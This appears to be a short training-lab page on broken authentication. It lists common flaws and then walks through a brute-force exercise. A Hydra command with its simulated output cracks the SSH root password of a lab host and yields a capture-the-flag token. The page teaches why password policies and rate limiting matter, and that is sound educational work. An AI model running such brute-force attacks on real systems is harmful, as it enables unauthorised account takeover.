# Broken Auth

If the front door lock is weak, it doesn't matter how thick the walls are.
Authentication vulnerabilities allow attackers to assume the identity of other users.

## Common Flaws

1.  **Weak Passwords:** "admin", "password123".
2.  **No Rate Limiting:** Allowing 10,000 login attempts per minute.
3.  **Session Fixation:** Attacker sets the victim's session ID.

## Lab: Brute Force

The admin has a weak password.
We will use **Hydra** to crack it.

Target: `10.10.10.50` (SSH)
User: `root`
Wordlist: `rockyou.txt`

<TerminalWindow 
  cmd="hydra -l root -P /usr/share/wordlists/rockyou.txt 10.10.10.50 ssh" 
  output="[DATA] attacking ssh://10.10.10.50:22/
[DATA] max 16 tasks per 1 server, overall 16 tasks
[22][ssh] host: 10.10.10.50   login: root   password: princess
1 of 1 target successfully completed, 1 valid password found
Flag: BL{Hydr4_H4il_Mary}" 
/>

The password was `princess`. This is why policies matter.
